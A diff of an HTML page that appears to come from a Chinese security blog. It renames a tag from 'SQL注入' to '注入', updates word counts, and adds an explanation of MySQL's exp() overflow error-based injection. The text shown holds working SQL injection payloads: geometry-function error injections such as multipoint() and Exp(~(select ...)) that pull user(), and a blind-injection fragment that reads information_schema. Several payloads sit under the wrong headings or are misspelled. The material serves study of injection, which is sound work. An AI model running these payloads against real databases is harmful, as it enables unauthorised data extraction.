@@ -412,8 +412,8 @@ Mysql 数据库查询流程查库select schema_name from information_schema.s">
                                 i春秋
                             </a>
                         
-                            <a href="/categories/i春秋/SQL注入/" class="post-category" target="_blank">
-                                SQL注入
+                            <a href="/categories/i春秋/注入/" class="post-category" target="_blank">
+                                注入
                             </a>
                         
                     </div>
@@ -431,14 +431,14 @@ Mysql 数据库查询流程查库select schema_name from information_schema.s">
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        2.9k
+                        3k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        12 分
+                        13 分
                     </div>
                     
                 
@@ -592,7 +592,8 @@ case (ascii(mid(select schema_name from information_schema.schemata limit 0,1))&
 <pre><code>multipoint((select * from(select * from(select user())a)b))</code></pre><h5 id="7。multipolygon"><a href="#7。multipolygon" class="headerlink" title="7。multipolygon()"></a>7。multipolygon()</h5><p><strong>payload</strong></p>
 <pre><code>multilinestring((select * from(select * from(select user())a)b))</code></pre><h5 id="8。linestring"><a href="#8。linestring" class="headerlink" title="8。linestring()"></a>8。linestring()</h5><p><strong>payload</strong></p>
 <pre><code>Multipollygon((select * from(select * from(select user())a)b))</code></pre><h5 id="9。multilinestring"><a href="#9。multilinestring" class="headerlink" title="9。multilinestring()"></a>9。multilinestring()</h5><p><strong>payload</strong></p>
-<pre><code>Multipollygon((select * from(select * from(select user())a)b))</code></pre><h5 id="10。exp"><a href="#10。exp" class="headerlink" title="10。exp()"></a>10。exp()</h5><p><strong>payload</strong></p>
+<pre><code>Multipollygon((select * from(select * from(select user())a)b))</code></pre><h5 id="10。exp-适用于MySQL5-5-5以上版本"><a href="#10。exp-适用于MySQL5-5-5以上版本" class="headerlink" title="10。exp() 适用于MySQL5.5.5以上版本"></a>10。exp() 适用于MySQL5.5.5以上版本</h5><h6 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h6><p>当传递一个大于709的直时，函数 exp() 就会引起一个溢出错误。在MySQL中，exp与ln和log功能相反，log和ln都返回以e为底的对数。exp返回的是以e为底的对数函数。<br>查询时使用否定查询造成数据溢出。将0安位取反就会返回“18446744073709551615”，利用函数成功执行后会返回0的缘故，将成功执行的函数取反后就会得到最大的无符号值。</p>
+<p><strong>payload</strong></p>
 <pre><code>Exp(~(select * from(select user())a))</code></pre>
             </div>
             <hr/>
@@ -846,8 +847,8 @@ case (ascii(mid(select schema_name from information_schema.schemata limit 0,1))&
                                     i春秋
                                 </a>
                             
-                            <a href="/categories/i春秋/SQL注入/" class="post-category" target="_blank">
-                                    SQL注入
+                            <a href="/categories/i春秋/注入/" class="post-category" target="_blank">
+                                    注入
                                 </a>
                             
                             
@@ -1083,7 +1084,7 @@ case (ascii(mid(select schema_name from information_schema.schemata limit 0,1))&
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">41.3k</span>
+                <span class="white-color">51.5k</span>
             
 
             
